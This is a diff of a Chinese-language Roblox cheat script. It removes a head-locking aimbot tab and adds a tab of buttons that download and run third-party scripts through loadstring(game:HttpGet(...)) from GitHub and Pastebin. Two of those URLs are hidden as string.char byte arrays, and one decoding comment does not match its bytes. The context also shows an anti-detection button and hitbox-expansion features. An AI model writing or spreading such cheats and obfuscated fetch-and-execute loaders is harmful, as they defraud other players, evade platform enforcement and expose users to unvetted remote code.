@@ -421,160 +421,6 @@ SurvivalSection:Button("启用基础反检测", function()
     end)
 end)
 
--- 5. 自瞄专区（新增头部锁定+默认头部）
-local AimTab = window:Tab("自瞄功能", "8112567890")
-local AimSection = AimTab:section("精准自瞄控制", true)
-
--- 自瞄核心变量（默认锁定部位改为头部）
-local aimEnabled = false
-local aimSmoothness = 5 -- 默认平滑度
-local crosshairRange = 100 -- 十字准心判定范围（像素）
-local targetLockMode = "Head" -- 默认锁头部
-local currentTarget = nil
-local maxAimDistance = 500 -- 默认最大锁定距离（ studs ）
-
--- 创建十字准心GUI
-local crosshairGui = Instance.new("ScreenGui")
-crosshairGui.Name = "AimCrosshair"
-crosshairGui.Parent = game.Players.LocalPlayer.PlayerGui
-crosshairGui.IgnoreGuiInset = true
-
--- 十字准心绘制（简单十字线，居中显示）
-local function createCrosshair()
-    -- 横向线
-    local horizontalLine = Instance.new("Frame")
-    horizontalLine.Size = UDim2.new(0, crosshairRange, 0, 2)
-    horizontalLine.Position = UDim2.new(0.5, -crosshairRange/2, 0.5, 0)
-    horizontalLine.BackgroundColor3 = Color3.new(1, 0, 0)
-    horizontalLine.BackgroundTransparency = 0.3
-    horizontalLine.Parent = crosshairGui
-
-    -- 纵向线
-    local verticalLine = Instance.new("Frame")
-    verticalLine.Size = UDim2.new(0, 2, 0, crosshairRange)
-    verticalLine.Position = UDim2.new(0.5, 0, 0.5, -crosshairRange/2)
-    verticalLine.BackgroundColor3 = Color3.new(1, 0, 0)
-    verticalLine.BackgroundTransparency = 0.3
-    verticalLine.Parent = crosshairGui
-
-    -- 中心点
-    local centerDot = Instance.new("Frame")
-    centerDot.Size = UDim2.new(0, 4, 0, 4)
-    centerDot.Position = UDim2.new(0.5, -2, 0.5, -2)
-    centerDot.BackgroundColor3 = Color3.new(1, 0, 0)
-    centerDot.BackgroundTransparency = 0.1
-    centerDot.Parent = crosshairGui
-end
-createCrosshair()
-
--- 获取准心范围内+最大距离内的最近目标（支持头部/身体锁定）
-local function getNearestTarget()
-    local localPlayer = game.Players.LocalPlayer
-    local localChar = localPlayer.Character
-    if not localChar or not localChar:FindFirstChild("HumanoidRootPart") then return nil end
-
-    local nearestTarget = nil
-    local nearestDistance = math.huge
-    local camera = workspace.CurrentCamera
-
-    -- 遍历所有玩家
-    for _, player in pairs(game.Players:GetPlayers()) do
-        if player ~= localPlayer and player.Character and player.Character.Humanoid.Health > 0 then
-            -- 根据锁定模式获取目标部位（优先头部，无则 fallback 到身体）
-            local targetPart = nil
-            if targetLockMode == "Head" then
-                targetPart = player.Character:FindFirstChild("Head")
-            elseif targetLockMode == "Body" then
-                targetPart = player.Character:FindFirstChild("HumanoidRootPart")
-            end
-
-            -- 目标部位不存在则跳过（防止角色加载异常）
-            if not targetPart then continue end
-
-            -- 1. 先检测三维空间距离是否在最大范围内
-            local actualDistance = (localChar.HumanoidRootPart.Position - targetPart.Position).Magnitude
-            if actualDistance > maxAimDistance then continue end -- 超出最大距离直接跳过
-
-            -- 2. 再检测是否在准心范围内
-            local screenPos = camera:WorldToScreenPoint(targetPart.Position)
-            local distanceFromCrosshair = math.sqrt(
-                math.pow(screenPos.X - game:GetService("GuiService"):GetGuiInset().X - game:GetService("CoreGui").RobloxGui.AbsoluteSize.X/2, 2) +
-                math.pow(screenPos.Y - game:GetService("GuiService"):GetGuiInset().Y - game:GetService("CoreGui").RobloxGui.AbsoluteSize.Y/2, 2)
-            )
-
-            if distanceFromCrosshair <= crosshairRange then
-                -- 3. 筛选最近目标
-                if actualDistance < nearestDistance then
-                    nearestDistance = actualDistance
-                    nearestTarget = targetPart
-                end
-            end
-        end
-    end
-    return nearestTarget
-end
-
--- 自瞄主循环
-game:GetService("RunService").RenderStepped:Connect(function()
-    if not aimEnabled then return end
-
-    local localPlayer = game.Players.LocalPlayer
-    local localChar = localPlayer.Character
-    local camera = workspace.CurrentCamera
-
-    if not localChar or not localChar:FindFirstChild("HumanoidRootPart") then return end
-
-    -- 更新最近目标
-    currentTarget = getNearestTarget()
-
-    -- 对准目标（平滑跟随）
-    if currentTarget then
-        local targetCFrame = CFrame.new(camera.CFrame.Position, currentTarget.Position)
-        -- 平滑插值计算
-        camera.CFrame = camera.CFrame:Lerp(targetCFrame, 1 / aimSmoothness)
-    end
-end)
-
--- 自瞄功能控件（新增头部选项，默认选中头部）
-AimSection:Label("🎯 自瞄核心设置")
-AimSection:Toggle("启用自瞄", "仅锁定准心范围内+最大距离内目标", false, function(state)
-    aimEnabled = state
-    crosshairGui.Visible = state -- 启用时显示十字准心，关闭时隐藏
-end)
-
-AimSection:Slider("自瞄平滑度", "数值越大越平滑（1-20）", 5, 1, 20, false, function(v)
-    aimSmoothness = v
-end)
-
-AimSection:Slider("准心判定范围", "像素值（50-300）", 100, 50, 300, false, function(v)
-    crosshairRange = v
-    -- 实时更新十字准心大小
-    crosshairGui:ClearAllChildren()
-    createCrosshair()
-end)
-
-AimSection:Slider("最大锁定距离", " studs 单位（100-2000）", 500, 100, 2000, false, function(v)
-    maxAimDistance = v
-end)
-
-AimSection:Label("🔍 锁定模式（默认头部）")
-AimSection:Dropdown("锁定部位", "选择要锁定的身体部位", { "头部", "身体" }, function(s)
-    targetLockMode = s == "头部" and "Head" or "Body"
-end)
-
-AimSection:Button("重置自瞄设置", function()
-    aimEnabled = false
-    aimSmoothness = 5
-    crosshairRange = 100
-    maxAimDistance = 500
-    targetLockMode = "Head" -- 重置后仍默认头部
-    currentTarget = nil
-    crosshairGui.Visible = false
-    -- 恢复十字准心默认大小
-    crosshairGui:ClearAllChildren()
-    createCrosshair()
-end)
-
 -- 5. 碰撞箱增强专区（新增）
 local HitboxTab = window:Tab("范围", "8112567890")
 local HitboxSection = HitboxTab:section("碰撞箱核心功能", true)
@@ -876,6 +722,52 @@ TeleportSection:Button("返回出生点", function()
         game.Players.LocalPlayer:LoadCharacter()
     end
 end)
+
+-- 6. 其他脚本专区（新增）
+local ExternalScriptTab = window:Tab("其他脚本中心", "8223678901")
+local ExternalScriptSection = ExternalScriptTab:section("其他脚本加载", true)
+ 
+ExternalScriptSection:Label("🌐 其他脚本")
+-- XK Hub 加载
+ExternalScriptSection:Button("加载 XK Hub", function()
+pcall(function()
+loadstring(game:HttpGet("https://github.com/devslopo/DVES/raw/main/XK%20Hub"))()
+warn("XK Hub 加载成功！")
+end)
+end)
+ 
+-- RB Hub 加载
+ExternalScriptSection:Button("加载 RB Hub", function()
+pcall(function()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Yungengxin/roblox/refs/heads/main/Rb-Hub"))()
+warn("RB Hub 加载成功！")
+end)
+end)
+ 
+-- 脚本中心 加载（解码ASCII字符）
+ExternalScriptSection:Button("加载 脚本中心", function()
+pcall(function()
+-- 解码ASCII字符串为URL：https://pastebin.com/raw/gexHwA1
+local url = string.char(104,116,116,112,115,58,47,47,112,97,115,116,101,98,105,110,46,99,111,109,47,114,97,119,47,103,101,109,120,72,119,65,49)
+loadstring(game:HttpGet(url))()
+warn("脚本中心 加载成功！")
+end)
+end)
+ 
+-- APT 脚本加载（解码ASCII字符）
+ExternalScriptSection:Button("加载 APT 脚本", function()
+pcall(function()
+-- 解码ASCII字符串为URL：https://raw.githubusercontent.com/nainshu/no/main/APT.lua
+local url = string.char(104,116,116,112,115,58,47,47,114,97,119,46,103,105,116,104,117,98,117,115,101,114,99,111,110,116,101,110,116,46,99,111,109,47,110,97,105,110,115,104,117,47,110,111,47,109,97,105,110,47,65,80,84,46,108,117,97)
+loadstring(game:HttpGet(url))()
+warn("APT 脚本加载成功！")
+end)
+end)
+ 
+ExternalScriptSection:Label("⚠️ 加载说明")
+ExternalScriptSection:Label("• 第三方脚本可能存在安全风险")
+ExternalScriptSection:Label("• 加载前请确保脚本来源可信")
+ExternalScriptSection:Label("• 若加载失败请检查网络或脚本链接有效性")
 
 -- 4. 辅助与杂项专区（新增除雾和去除阴影功能）
 local UtilityTab = window:Tab("辅助杂项", "8001456789")
